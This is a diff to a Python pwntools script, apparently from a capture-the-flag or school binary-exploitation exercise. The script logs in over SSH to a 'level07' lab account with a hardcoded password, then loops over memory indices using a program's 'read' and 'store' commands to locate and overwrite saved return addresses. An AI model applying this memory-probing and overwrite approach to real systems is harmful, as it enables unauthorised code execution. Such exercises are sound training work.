@@ -5,7 +5,7 @@ import time
 
 login="level07"
 password="GbcPDRgsFK77LNnnuh7QyFYA2942Gp8yKj9KrWD8"
-host="192.168.244.56"
+host="192.168.34.56"
 port=42421
 s=pwn.ssh(login, host, password=password, port=port)
 
@@ -32,24 +32,26 @@ p=s.process("/home/users/level07/level07")
 time.sleep(0.2)
 ft_recv(p, 1024)
 eip=[134514202, 134514422, 134514927, 134514992]
-x=0
-index=114
+index=100
 while True:
     p.sendline(b"read")
     p.sendline(f"{index}".encode())
     time.sleep(0.2)
     answ = ft_recv(p, 1024)
     print(f"index={index} answ={answ}")
-    if f"{eip[x]}" in answ:
-        print(f"{eip[x]} found at index {index}")
-        p.sendline(b"store")
-        p.sendline(b"42")
-        p.sendline(f"{index}".encode())
-        time.sleep(0.2)
-        answer = ft_recv(p, 1024)
-        if not "wil" in answer:
-            print("GOTCHAT")
-            break
-        index=114
-        x+=1
+    for x in range(0, 4):
+        found=0
+        if f"{eip[x]}" in answ:
+            print(f"{eip[x]} found at index {index}")
+            p.sendline(b"store")
+            p.sendline(b"42")
+            p.sendline(f"{index}".encode())
+            time.sleep(0.2)
+            answer = ft_recv(p, 1024)
+            if not "wil" in answer:
+                found=1
+                print("GOTCHAT")
+                break
+    if found==1:
+        break
     index+=1
